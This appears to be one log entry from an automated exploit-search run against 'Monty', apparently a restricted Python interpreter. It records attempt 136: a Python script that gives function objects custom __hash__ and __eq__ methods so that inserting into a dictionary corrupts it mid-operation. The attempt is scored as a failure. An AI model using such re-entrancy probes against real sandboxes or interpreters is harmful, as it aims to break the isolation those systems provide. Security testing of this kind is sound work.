# Attempt 136 - 2026-06-07T10:12:52.079468+00:00
## Template: A | Score: 0 - Nothing - standard error
## Exploit code
```python
# DictReentry exploit - functions as keys, __eq__ mutates dict
import sys

def f1():
    return "f1"

def f2():
    return "f2"

target_dict = {}

def make_hash(self):
    return 42

def make_eq(self, other):
    target_dict["injected"] = "corrupted"
    return False

setattr(f1, "__hash__", make_hash)
setattr(f1, "__eq__", make_eq)
setattr(f2, "__hash__", make_hash)
setattr(f2, "__eq__", lambda s, o: False)

target_dict[f1] = "value1"
print(f"After f1: {target_dict}")

try:
    target_dict[f2] = "value2"
    print(f"After f2: {target_dict}")
except Exception as e:
    print(f"Error: {e}")

print(f"Final: {target_dict}")
print(f"Corruption: {'YES' if 'injected' in target_dict else 'NO'}")
print(f"Size: {len(target_dict)}")
sys.exit(0)
```

## Result
Context: Template A DictReentry - cannot setattr on function objects in Monty (no __dict__)
Score: 0/5 - Nothing - standard error
